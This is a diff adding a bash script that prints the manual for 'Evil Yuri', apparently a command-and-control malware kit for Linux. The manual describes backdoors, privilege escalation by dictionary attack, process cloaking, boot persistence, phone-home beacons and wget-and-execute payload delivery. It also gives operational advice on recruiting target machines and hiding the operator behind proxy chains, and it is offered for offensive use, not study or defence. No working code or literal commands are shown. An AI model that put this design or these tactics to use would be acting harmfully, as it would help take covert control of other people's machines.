@@ -1,0 +1,110 @@
+#!/bin/bash
+#
+# Regards, the Alveare Solutions society.
+#
+
+cat<<EOF
+# EVIL YURI (v1.0 Electromancer)
+
+Evil Yuri is a command and control tool that allows one machine (known as the
+MasterMind machine) to obtain control over and manage any other number of machines
+(currently supported platform is Linux x64).
+
+This is achieved via two other components that can be thought of as Yuri subsystems,
+the Evil Minion (used to scan the Conscript machine and phone home), and the
+HYpnotiK Payload (used to escalate privileges, open backdoor, cloak processes and
+phone home).
+
+Yuri can run in one of three running modes: CLI, Util and Test. The default is CLI,
+here we get a numbered menu that the user can interact with upon executing (evil-yuri).
+Util running mode can only be configured from the (conf/evil-yuri.conf) file, and
+can be overriden by the CLI argument but cannot override CLI running mode. This way
+of using Yuri aids integration with other systems. The Test running mode runs the
+entire test suit using the previously mentioned configuration file as input data.
+
+Deployments are accomplished via the means of an FTP server, this can either be the
+one Yuri comes built in with (vsftpd), or another one in a different location. All
+that is required is that you specify the external IPv4 address of the FTP server.
+Upon deployment of the HYpnotiK Payload, Yuri gets access to the Conscript shell
+via the backdoor set up by the Evil Minion, and issues a (wget) command to pull and
+execute the payload file.
+
+Yuri also harvests the power of our WiFi Commander and Game Changer cargo scripts,
+for wireless network management and compiling shell scripts (used mainly on minions
+and payloads).
+
+-- Component Subsystems --
+
+    * Evil Minion (v1.0 Explorer)
+        * [ DESCRIPTION      ]: Software used during Stage 1 of conscript
+                                recruitment. Uses generic commands to probe
+                                conscript machine.
+        * [ MINION PATH      ]: minions/evil-minion.sh
+        * [ PRIME DIRECTIVES ]:
+            * Open Raw Socket Backdoor
+                * Generated Raw Backdoor script and execute.
+            * Scan Conscript Machine
+                * username
+                * OS
+                * external IPv4
+                * architecture
+                * additional details
+            * Phone Home
+            * Set INIT at boot
+
+    * HYpnotiK Payload (v1.0 Infiltrator)
+        * [ DESCRIPTION      ]: Software used during Stage 2 of conscript
+                                recruitment. Uses intructions specific for
+                                conscript operating system, architecture and
+                                environment.
+        * [ PAYLOAD PATH     ]: payloads/hypnotik-payload.sh
+        * [ PRIME DIRECTIVES ]:
+            * Open Backdoor
+                * Protocol == raw
+                    * Generated Raw Backdoor script and execute.
+                * Protocol == ssh
+                    * Creates dedicated system user and starts SSH server.
+            * Escalate priviledges (via dictionary attack)
+            * Install dependencies
+            * Set INIT at boot
+            * Create dedicated system user
+            * Cloak HYpnotiK processes
+            * Lift Evil Minion anchor (triggers Minion self destruct sequence)
+            * Phone Home
+
+-- WarGaming Strategies --
+
+If you have a delivery method already in place to deliver the Evil Minion to the
+target machines, your best bet is to start the Minion Listener in the background
+and keep a close eye on the registered conscript index. When the minions phone
+home, Yuri will automatically format a conscript record and register it.
+
+[ NOTE ]: In a future version, all conscripts registered via a Minions phone home
+          will receive the correct payload for the reported operating system and
+          hardware specifications.
+
+If you are passed gathering intel on one of your targets and you just want to
+quickly register his machine as a Conscript, you can add him manually. If your
+information is correct, at this point you should also be able to manually deploy
+first the Evil Minion and then the correct payload for the target.
+
+-- Glossary Of Terms --
+
+Evil Yuri       - C&C Server (incorporated FTP server for deployments)
+Master Mind     - Physical machine that Yuri runs on
+Commander       - Master Mind user
+Evil Minion     - Yuri's scout (acquires & reports intel on target machine)
+HYpnotiK        - Yuri's tool set (escalates privileges, sets up backdoor, hides processes, etc)
+Payload Server  - FTP server that the Conscript downloads the payload files from
+Minion Listener - Yuri's built-in server that listens for Minions phoning home
+
+-- Proxy Chain Usecase --
+                                            (EvilYuri runs here)
+
+    | You | -> | Proxy1 | -> | Proxy2 | -> | MasterMind Machine |
+                                            __________|__________
+                                            |                   |
+                                     | Conscript1 |       | Conscript2 |
+
+                                      (EvilMinion & HYpnotiK run here)
+EOF
